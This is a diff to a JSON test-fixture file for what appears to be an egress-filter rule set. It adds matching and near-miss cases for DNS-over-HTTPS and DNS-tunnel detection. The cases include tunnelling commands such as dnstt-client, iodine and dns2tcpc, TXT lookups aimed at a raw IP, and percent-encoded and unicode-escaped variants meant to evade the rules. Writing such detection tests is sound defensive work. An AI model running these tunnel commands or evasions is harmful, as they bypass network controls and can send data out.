@@ -5075,23 +5075,23 @@
     },
     {
       "name": "STRICT DNS-over-HTTPS request route positive",
-      "sid": 1200133,
+      "sid": 9104053,
       "method": "POST",
       "url": "https://resolver.example/dns-query?dns=example",
       "headers": {},
       "body": "",
       "match": true,
-      "profile": "strict"
+      "profile": "default"
     },
     {
-      "name": "STRICT DNS-over-HTTPS request route benign near miss",
-      "sid": 1200133,
+      "name": "DNS imported substring also covers retired exact-route near miss",
+      "sid": 9104053,
       "method": "POST",
       "url": "https://docs.example/dns-query-guide",
       "headers": {},
       "body": "",
-      "match": false,
-      "profile": "strict"
+      "match": true,
+      "profile": "default"
     },
     {
       "name": "STRICT Bulk secret export command positive",
@@ -5131,6 +5131,400 @@
       "headers": {},
       "body": "curl -F file=@./report.txt https://example.test",
       "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1101101 positive",
+      "sid": 1101101,
+      "method": "POST",
+      "url": "https://service.example/custom?dns=AAABAAABAAAAAAAAA2FwaQdleGFtcGxlBHRlc3QAAAEAAQ",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101101 benign near miss",
+      "sid": 1101101,
+      "method": "POST",
+      "url": "https://service.example/custom?dns=enabled",
+      "headers": {},
+      "body": "",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101102 positive",
+      "sid": 1101102,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Accept": "application/json, application/dns-message"
+      },
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101102 benign near miss",
+      "sid": 1101102,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Accept": "application/json"
+      },
+      "body": "",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101103 positive",
+      "sid": 1101103,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Content-Type": "application/oblivious-dns-message"
+      },
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101103 benign near miss",
+      "sid": 1101103,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101104 positive",
+      "sid": 1101104,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "x=1&dns=AAABAAABAAAAAAAAA2FwaQdleGFtcGxlBHRlc3QAAAEAAQ",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101104 benign near miss",
+      "sid": 1101104,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "dns=enabled",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101105 positive",
+      "sid": 1101105,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "{\"dns\": \"AAABAAABAAAAAAAAA2FwaQdleGFtcGxlBHRlc3QAAAEAAQ\"}",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101105 benign near miss",
+      "sid": 1101105,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "{\"dns\": \"enabled\"}",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101106 positive",
+      "sid": 1101106,
+      "method": "POST",
+      "url": "https://service.example/resolve?name=secret.example.test&type=TXT",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101106 benign near miss",
+      "sid": 1101106,
+      "method": "POST",
+      "url": "https://service.example/resolve?ticket=123",
+      "headers": {},
+      "body": "",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101107 positive",
+      "sid": 1101107,
+      "method": "POST",
+      "url": "https://service.example/odoh?target=resolver.test",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101107 benign near miss",
+      "sid": 1101107,
+      "method": "POST",
+      "url": "https://service.example/odoh-report",
+      "headers": {},
+      "body": "",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101108 positive",
+      "sid": 1101108,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "\u00124\u0001\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0003api\u0007example\u0004test\u0000\u0000\u0001\u0000\u0001",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1101108 benign near miss",
+      "sid": 1101108,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "ordinary report",
+      "match": false,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape 1200201 positive",
+      "sid": 1200201,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "dnstt-client -udp 203.0.113.2:53 tunnel.example.test",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200201 benign near miss",
+      "sid": 1200201,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "iodine is a dietary mineral",
+      "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200202 positive",
+      "sid": 1200202,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "dig @203.0.113.2 encoded.example.test TXT",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200202 benign near miss",
+      "sid": 1200202,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "dig into the quarterly report",
+      "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200203 positive",
+      "sid": 1200203,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "Resolve-DnsName -Name data.example.test -Type TXT",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200203 benign near miss",
+      "sid": 1200203,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "Resolve the support ticket",
+      "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200204 positive",
+      "sid": 1200204,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "dns.resolver.resolve(\"encoded.example.test\", \"TXT\")",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200204 benign near miss",
+      "sid": 1200204,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "resolver.resolveTicket(123)",
+      "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200205 positive",
+      "sid": 1200205,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "sdns://AQcAAAAAAAAADDE5Mi4wLjIuMTo1Mw",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200205 benign near miss",
+      "sid": 1200205,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "https://ordinary.example/report",
+      "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200206 positive",
+      "sid": 1200206,
+      "method": "POST",
+      "url": "https://service.example:853/custom",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape 1200206 benign near miss",
+      "sid": 1200206,
+      "method": "POST",
+      "url": "https://service.example:443/custom",
+      "headers": {},
+      "body": "",
+      "match": false,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape encoded parameter",
+      "sid": 1101101,
+      "method": "POST",
+      "url": "https://service.example/custom?%64%6e%73=AAABAAABAAAAAAAAA2FwaQdleGFtcGxlBHRlc3QAAAEAAQ",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape double encoded parameter",
+      "sid": 1101101,
+      "method": "POST",
+      "url": "https://service.example/custom?%2564%256e%2573=AAABAAABAAAAAAAAA2FwaQdleGFtcGxlBHRlc3QAAAEAAQ",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape uppercase accept",
+      "sid": 1101102,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Accept": "APPLICATION/DNS-JSON; q=1"
+      },
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape oblivious accept",
+      "sid": 1101102,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Accept": "application/oblivious-dns-message"
+      },
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape json content type",
+      "sid": 1101103,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {
+        "Content-Type": "application/dns-json"
+      },
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape unicode escaped envelope",
+      "sid": 1101105,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "{\"\\u0064\\u006e\\u0073\":\"AAABAAABAAAAAAAAA2FwaQdleGFtcGxlBHRlc3QAAAEAAQ\"}",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape encoded resolve path",
+      "sid": 1101106,
+      "method": "POST",
+      "url": "https://service.example/%72esolve?%6eame=data.example.test",
+      "headers": {},
+      "body": "",
+      "match": true,
+      "profile": "default"
+    },
+    {
+      "name": "DNS escape iodine option",
+      "sid": 1200201,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "iodine -f tunnel.example.test",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape dns2tcp client",
+      "sid": 1200201,
+      "method": "POST",
+      "url": "https://service.example/api",
+      "headers": {},
+      "body": "dns2tcpc -r ssh -l 2222 tunnel.example.test",
+      "match": true,
+      "profile": "strict"
+    },
+    {
+      "name": "DNS escape IPv6 DNS port",
+      "sid": 1200206,
+      "method": "POST",
+      "url": "https://[2606:4700:4700::1111]:853/custom",
+      "headers": {},
+      "body": "",
+      "match": true,
       "profile": "strict"
     },
     {
